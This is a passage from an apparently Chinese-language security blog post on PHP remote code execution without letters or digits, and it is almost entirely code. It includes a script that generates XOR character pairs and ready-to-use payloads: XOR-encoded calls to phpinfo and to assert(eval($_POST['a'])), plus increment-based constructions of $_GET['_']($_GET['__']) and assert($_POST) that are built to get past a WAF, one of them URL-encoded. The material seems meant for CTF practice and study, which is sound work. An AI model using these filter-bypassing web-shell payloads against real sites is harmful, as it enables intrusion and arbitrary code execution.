<span class="token variable">$exp2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$k</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$k</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">>=</span> <span class="token number">48</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">48</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$j</span> <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$j</span> <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$j</span> <span class="token operator">&lt;=</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">continue</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$exp1</span> <span class="token operator">=</span> <span class="token variable">$exp1</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$exp2</span> <span class="token operator">=</span> <span class="token variable">$exp2</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token variable">$exp1</span><span class="token operator">.</span><span class="token string single-quoted-string">'^'</span><span class="token operator">.</span><span class="token variable">$exp2</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span></code></pre>

<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">^</span><span class="token operator">%</span>a0<span class="token operator">%</span>b8<span class="token operator">%</span>ba<span class="token operator">%</span>ab<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>ff<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token operator">%</span>ff<span class="token operator">=</span>phpinfo
<span class="token operator">==</span><span class="token operator">></span>  <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    
<span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">^</span><span class="token operator">%</span>a1<span class="token operator">%</span>b9<span class="token operator">%</span>bb<span class="token operator">%</span>aa<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">^</span><span class="token operator">%</span>a1<span class="token operator">%</span>b9<span class="token operator">%</span>bb<span class="token operator">%</span>aa<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token constant">_</span><span class="token operator">=</span>assert<span class="token operator">&amp;</span><span class="token constant">__</span><span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token operator">%</span><span class="token number">27</span>a<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">></span>  <span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"eval(<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span></span>)"</span><span class="token punctuation">)</span></code></pre>

<p>测试结果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809124757860.png" alt loading="lazy"></p>
<p>类似的</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$_</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"!((%)("</span><span class="token operator">^</span><span class="token string double-quoted-string">"@[[@[\\"</span><span class="token punctuation">;</span>   <span class="token comment">//构造出assert</span>
<span class="token variable">$__</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"!+/(("</span><span class="token operator">^</span><span class="token string double-quoted-string">"~&#123;`&#123;|"</span><span class="token punctuation">;</span>   <span class="token comment">//构造出_POST</span>
<span class="token variable">$___</span> <span class="token operator">=</span> <span class="token variable">$$__</span><span class="token punctuation">;</span>   <span class="token comment">//$___ = $_POST</span>
<span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//assert($_POST[_]);</span></span></code></pre>

<h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//俩数组拼接强行返回ArrayArray,这里一个短杠的值也就是ArrayArray</span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>  <span class="token comment">//两个短杠赋值为空</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string single-quoted-string">''</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//从arrayarray中取首字符，即a。这里$_=$_[0]也是一样的道理，不过waf限制数字输入</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//b</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//c</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//d</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//e</span>
<span class="token variable">$__</span><span class="token operator">.=</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//E  把两个短杠赋值为E</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//F  一个短杠继续自增</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//G </span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// GE  一个短杠自增变成了G，两个短杠在前面第十一行处已经赋值为E，拼接得GE</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//H 此处一个短杠继续自增，为H</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//I</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//J</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//k</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//L</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//M</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//N</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//O</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//P</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//Q</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//R</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//S</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//T</span>
<span class="token variable">$__</span><span class="token operator">.=</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">// GET 在此处，两条短杠原是GE与一条短杠（已经自增为T），.=拼接，构成get</span>
<span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 进行拼接，$_GET['_']($_GET['__']);</span>

url编码后：
<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">.</span><span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">.</span><span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">27</span>_<span class="token operator">%</span><span class="token number">27.</span><span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">7</span>d<span class="token operator">%</span><span class="token number">5</span>b_<span class="token operator">%</span><span class="token number">5</span>d<span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">27</span>_<span class="token operator">%</span><span class="token number">27.</span><span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">7</span>d<span class="token operator">%</span><span class="token number">5</span>b__<span class="token operator">%</span><span class="token number">5</span>d<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>b</span></code></pre>

<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$_</span><span class="token operator">=</span>@<span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$_</span></span>"</span><span class="token punctuation">;</span> <span class="token comment">// $_='Array';</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'!'</span><span class="token operator">==</span><span class="token string single-quoted-string">'@'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// $_=$_[0];</span>
<span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">// A</span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span>
<span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// S</span>
<span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// S</span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// E </span>
<span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// R</span>
<span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// T</span>
<span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span>

<span class="token variable">$____</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// P</span>
<span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
